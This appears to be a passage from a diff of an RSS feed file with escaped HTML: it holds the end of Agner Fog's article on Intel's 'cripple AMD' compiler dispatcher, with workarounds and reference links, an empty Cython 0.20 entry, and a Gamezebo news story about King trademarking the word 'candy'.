+software. I have described the technical details &lt;a href=&quot;http://aceshardware.freeforums.org/cpuid-family-bits-added-because-of-flaw-in-intel-compiler-t428.html&quot;&gt;elsewhere&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;Perhaps the initial design of Intel's CPU dispatcher was indeed intended
+to optimize for known processor models only, without regard for future models.
+If any of my students had made such a solution that was not future-oriented, I
+would consider it a serious flaw. Perhaps the Intel engineers discovered the
+missing support for future processors too late so that they had to design the
+next generation of their processors in such a way that they appeared as known
+models to existing Intel software. &lt;/p&gt;
+&lt;p&gt;After Intel had flatly denied to change their CPU dispatcher, I decided that
+the most efficient way to make them change their minds was to create publicity
+about the problem. I contacted several IT magazines, but nobody wanted to write
+about it. Sad, but not very surprising, considering that they all depend on
+advertising money from Intel. The only publicity was my own &lt;a href=&quot;http://www.agner.org/optimize/#manual_cpp&quot;&gt;optimization
+manual&lt;/a&gt; where I have described the problem in detail and given instructions
+on how to replace the unfair CPU dispatcher. I wonder why AMD didn't create
+public awareness about the problem. Were they obliged to keep quiet about an
+ungoing lawsuit? And what about VIA/Centaur? &lt;/p&gt;
+
+&lt;h2&gt;Workarounds &lt;/h2&gt;
+&lt;p&gt;At present, we don't know if or when Intel will make a new compiler and new
+software libraries that do not check the vendor ID string. In the meantime, here
+is what we can do about the problem. &lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Use another compiler. In &lt;a href=&quot;http://www.agner.org/optimize/#manual_cpp&quot;&gt;my
+    tests&lt;/a&gt;, the Gnu compiler for Linux has an optimizing performance similar
+    to the Intel compiler, but the Gnu function library (glibc) is inferior. All
+    other compilers gave lower performance in my tests. There is no other Windows
+    compiler with a similar performance, not even the Gnu compiler for Windows.&lt;br&gt;
+    &amp;#xA0;&amp;#xA0;&lt;/li&gt;
+  &lt;li&gt;Use the Intel software and patch the CPU dispatcher. In &lt;a href=&quot;http://www.agner.org/optimize/#manual_cpp&quot;&gt;my
+    C++ manual&lt;/a&gt;, I have provided the code for alternative CPU dispatchers for
+    Intel's compiler and function libraries and descriptions on how to patch
+    them into your software. This, of course, relies on undocumented details of
+    the Intel software. This dispatcher-patch can improve performance on
+    non-Intel processors considerably in many cases.&lt;br&gt;
+    &amp;#xA0;&amp;#xA0;&lt;/li&gt;
+  &lt;li&gt;Never trust any benchmark unless it is open source and compiled with a
+    neutral compiler, such as Gnu or Microsoft.&lt;br&gt;
+    &amp;#xA0; &amp;#xA0;&lt;/li&gt;
+  &lt;li&gt;It is possible to change the CPUID of AMD processors by using
+    the AMD virtualization instructions. I hope that somebody will volunteer to
+    make a program for this purpose. This will make it easy for anybody to check
+    if their benchmark is fair and to improve the performance of software
+    compiled with the Intel compiler on AMD processors.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;Links&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://aceshardware.freeforums.org/cpuid-family-bits-added-because-of-flaw-in-intel-compiler-t428.html&quot;&gt;My
+Discussion in Aceshardware forum 2007&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://forums.amd.com/devforum/messageview.cfm?catid=203&amp;amp;threadid=95754&quot;&gt;Discussion
+in AMD Developer Forums 2008&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.amdzone.com/phpbb3/viewtopic.php?f=52&amp;amp;t=137269&amp;amp;sid=3571329cc7c1238a819d02de4bf906f5&quot;&gt;My
+Discussion in AMDzone 2009&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://groups.google.co.uk/group/comp.arch/browse_frm/thread/4e42f16511cf8640?hl=en&amp;amp;lr=&amp;amp;ie=UTF-8&amp;amp;rnum=1&amp;amp;prev=/groups%3Fq%3Dintel%2Bcompiler%2Btrick%26hl%3Den%26lr%3D%26ie%3DUTF-8%26selm%3Dvlfnf1-8tm.ln1%2540miriam.mikron.de%26rnum%3D1&quot;&gt;Discussion
+in comp.arch 2004&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://yro.slashdot.org/comments.pl?sid=155593&amp;amp;cid=13042922&quot;&gt;Complaint
+to Intel 2004, discussion in slashdot.org&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.swallowtail.org/naughty-intel.shtml&quot;&gt;Mark Mackey,
+complaint to Intel 2005&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://arstechnica.com/hardware/reviews/2008/07/atom-nano-review.ars/6&quot;&gt;PCMark
+2005 benchmark proven unfair. Arstechnica&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.brightsideofnews.com/print/2009/12/17/why-the-ftc-lawsuit-against-intel-has-substance.aspx&quot;&gt;Testimony
+by &lt;span id=&quot;ctl00_ContentPlaceHolder1_NewsXXL1_Label4&quot;&gt;John Oram regarding &lt;span id=&quot;ctl00_ContentPlaceHolder1_NewsXXL1_Label3&quot;&gt;BAPCo&lt;/span&gt;&lt;/span&gt;benchmark organization&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://developer.amd.com/documentation/articles/pages/4292005119.aspx&quot;&gt;Comment
+on AMD Developer Central 2005&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.theregister.co.uk/2005/07/12/amd_vs_intel_code/&quot;&gt;AMD
+files lawsuit 2005&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://techreport.com/discussions/8547&quot;&gt;AMD untitrust complaints
+2005&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://download.intel.com/pressroom/legal/AMD_settlement_agreement.pdf&quot;&gt;Settlement agreement
+between AMD and Intel, 2009&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.ftc.gov/os/adjpro/d9341/091216intelcmpt.pdf&quot;&gt;FTC complaint
+2009&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.agner.org/optimize/#manual_cpp&quot;&gt;Technical details
+in my C++ optimization manual&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;span class=&quot;mod&quot;&gt;[Added later:]&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.xtremesystems.org/forums/showthread.php?t=242272&quot;&gt;Discussion on XtremeSystems Forum&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.osnews.com/story/22683/Intel_Forced_to_Remove_quot_Cripple_AMD_quot_Function_from_Compiler_&quot;&gt;Discussion on OSnews&lt;/a&gt;.&lt;/p&gt;&lt;/td&gt;&lt;/div&gt;
+</description>
+<title>
+Intel's &quot;cripple AMD&quot; function (2009)
+</title>
+</item>
+<item>
+<link>
+https://github.com/cython/cython/blob/master/CHANGES.rst#020-2014-01-18
+</link>
+<description>
+
+</description>
+<title>
+Cython 0.20
+</title>
+</item>
+<item>
+<link>
+http://www.gamezebo.com/news/2014/01/20/king-has-trademarked-word-candy-and-youre-probably-infringing
+</link>
+<description>
+&lt;div&gt;&lt;div class=&quot;page_reviewbox_content_details font14&quot;&gt;
+&lt;div class=&quot;fltleft gaprt20 gapbot20&quot;&gt;&lt;img src=&quot;http://2a34166a1c224507ff54-79590be14f37a3e58649da10f58ee927.r67.cf1.rackcdn.com/news/game_title_image/1390232832.png&quot;&gt;&lt;/div&gt;
+&lt;p&gt;When you have an intellectual property &amp;#x2013; especially one that&amp;#x2019;s worth millions of dollars &amp;#x2013; you want to protect it. But can such protections ever go too far? That&amp;#x2019;s the question a lot of industry watchers are asking this morning, as developers far and wide whose games include the word &amp;#x2018;candy&amp;#x2019; are getting emails from Apple on behalf of King, the makers of &lt;em&gt;&lt;a href=&quot;http://www.gamezebo.com/games/candy-crush-saga/review&quot;&gt;Candy Crush Saga&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;In &lt;a href=&quot;http://www.trademarkia.com/candy-85842584.html&quot;&gt;a filing with the US trademark office&lt;/a&gt; dated February 6, 2013, King.com Limited registered claim to the word &amp;#x2018;candy&amp;#x2019; as it pertains to video games and, strangely, clothing. On January 15, 2014 the filing was approved. And now, a mere five days later, reports are coming in from developers that they&amp;#x2019;re being asked to remove their app (or prove that their game doesn&amp;#x2019;t infringe upon the trademark).&lt;/p&gt;&lt;p&gt;&amp;#x201C;Lots of devs are frustrated cause it seems so ridiculous&amp;#x201D; says Benny Hsu, the maker of &lt;em&gt;&lt;a href=&quot;https://itunes.apple.com/us/app/all-candy-casino-slots-jewels/id788815470&quot;&gt;All Candy Casino Slots &amp;#x2013; Jewel Craze Connect: Big Blast Mania Land&lt;/a&gt;&lt;/em&gt;. Benny&amp;#x2019;s game, which shares no similarities with King&amp;#x2019;s properties aside from the word &amp;#x2018;candy,&amp;#x2019; is one of a number of games that have been targeted by King.&lt;/p&gt;&lt;p&gt;&lt;a class=&quot;gallery colorbox-load&quot; title=&quot;news&quot; href=&quot;http://2a34166a1c224507ff54-79590be14f37a3e58649da10f58ee927.r67.cf1.rackcdn.com/news/full/1390231848.&quot;&gt;&lt;img src=&quot;http://2a34166a1c224507ff54-79590be14f37a3e58649da10f58ee927.r67.cf1.rackcdn.com/news/medium/1390231847.&quot; alt=&quot;news&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Hsu contacted Sophie Hallstrom, King&amp;#x2019;s IP paralegal, to discuss the matter further. Rather than the simple &amp;#x201C;oops, our mistake&amp;#x201D; that Benny was hoping for, he was given a very finite response. &amp;#x201C;Your use of CANDY SLOTS in your app icon uses our CANDY trade mark exactly, for identical goods, which amounts to trade mark infringement and is likely to lead to consumer confusion and damage to our brand,&amp;#x201D; reads Hallstrom&amp;#x2019;s reply. &amp;#x201C;The addition of only the descriptive term &quot;SLOTS&quot; does nothing to lessen the likelihood of confusion.&amp;#x201D;&amp;#xA0;&lt;/p&gt;&lt;p&gt;So how does a word like &amp;#x2018;candy&amp;#x2019; get trademarked? According to Martin Schwimmer, a partner at the IP legal firm &lt;a href=&quot;http://www.leasonellis.com/&quot;&gt;Leeson Ellis&lt;/a&gt; (and the man behind &lt;a href=&quot;http://www.trademarkblog.com/&quot;&gt;The Trademark Blog&lt;/a&gt;), it&amp;#x2019;s all about how strong a connection the claimant has to that mark when it comes to a particular good or service. Think of Apple, for example. Nobody is going to expect the electronics giant to lay claim over the fruit, but if someone were to try to market an electronic device under that name, you&amp;#x2019;d better believe their lawyers would swoop in.&lt;/p&gt;&lt;p&gt;So the question then, is whether or not there&amp;#x2019;s a strong enough connection between the word &amp;#x2018;candy&amp;#x2019; and video games as it pertains to &lt;em&gt;Candy Crush Saga&lt;/em&gt;. According to the US Trademark Office, the answer is a bona fide yes.&lt;/p&gt;&lt;p&gt;Still, holding a trademark and being able to enforce it are entirely different things. Schwimmer is quick to point out the difference between suggestive marks and unique ones. &amp;#x201C;Someone can't plausibly claim that they came up with the term TEENAGE MUTANT NINJA TURTLES on their own. &amp;#xA0;An incredibly unique trademark like that is somewhat easy to protect.&amp;#x201D; But something generic &amp;#x2013; a dictionary word like candy? That can be a lot trickier.&lt;/p&gt;&lt;p&gt;&lt;a class=&quot;gallery colorbox-load&quot; title=&quot;news&quot; href=&quot;http://2a34166a1c224507ff54-79590be14f37a3e58649da10f58ee927.r67.cf1.rackcdn.com/news/full/1390231780.jpeg&quot;&gt;&lt;img src=&quot;http://2a34166a1c224507ff54-79590be14f37a3e58649da10f58ee927.r67.cf1.rackcdn.com/news/medium/1390231778.jpeg&quot; alt=&quot;news&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;Benny Hsu's &lt;a href=&quot;https://itunes.apple.com/us/app/all-candy-casino-slots-jewels/id788815470&quot;&gt;All Candy Casino Slots&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;&lt;p&gt;&amp;#x201C;Suggestive marks are protectable, but the problem is that third parties can claim that they thought up their mark on their own.&amp;#x201D; And in the case of something as generic as &amp;#x2018;candy,&amp;#x2019; it doesn&amp;#x2019;t seem that farfetched to think that a lot of developers may have.&lt;/p&gt;&lt;p&gt;&amp;#x201C;As to how far King can enforce its rights, it will be a function of how strong its mark has become, and how similar the third party name is. &amp;#xA0;It would likely be able to enforce its rights against marks that are connotatively, phonetically or visually similar, for games that are conceivably competitive,&amp;#x201D; Schwimmer tells us. &amp;#x201C;King can't go after candy companies because candy companies don't use the term CANDY as a trademark &amp;#x2013; they use it to identify their product.&amp;#x201D;&lt;/p&gt;&lt;p&gt;If you&amp;#x2019;re a developer who has received one of these letters from King, Schwimmer&amp;#x2019;s advice is simple: call a lawyer. &amp;#x201C;A trademark lawyer can be very useful in obtaining a coexistence agreement. &amp;#xA0;Often a trademark owner will accept a settlement in which the possibility of confusion is mitigated, perhaps because the developer will not expand into areas more directly competitive with the trademark owner.&amp;#x201D;&lt;/p&gt;&lt;p&gt;But in an App Store littered with small indie developers, this is an option that seems out of reach for developers like Benny Hsu. &amp;#x201C;Myself and other indie developers don't have the money or resources to fight back&amp;#x2026; I plan on changing the name if that is what I must do.&amp;#x201D;&lt;/p&gt;&lt;p&gt;With Apple seemingly complicit in King&amp;#x2019;s claims &amp;#x2013; the letter Tsu initially received came through the iTunes legal department &amp;#x2013; one can&amp;#x2019;t help but wonder what the future of the App Store and suggestive trademarks might be.&lt;/p&gt;&lt;p&gt;&amp;#x201C;Last year I learned I couldn't use the word MEMORY because it was trademarked,&amp;#x201D; said Hsu. &amp;#x201C;Now I wonder what other common words will be trademarked in the App Store.&amp;#x201D;&lt;/p&gt;
+
+&lt;p class=&quot;tags&quot;&gt;
+&lt;strong&gt;Read more:&lt;/strong&gt; &lt;a href=&quot;http://www.gamezebo.com/tag/candy-crush-saga&quot;&gt;Candy Crush Saga&lt;/a&gt;, &lt;a href=&quot;http://www.gamezebo.com/tag/king&quot;&gt;King&lt;/a&gt;, &lt;a href=&quot;http://www.gamezebo.com/tag/copyright&quot;&gt;copyright&lt;/a&gt; &lt;/p&gt;
+&lt;/div&gt;
+ 
+ 
+ 
+ 
+&lt;/div&gt;
+</description>
+<title>
+Candy Crush Saga creators have trademarked the word “candy”
 </title>
 </item>
 </channel>
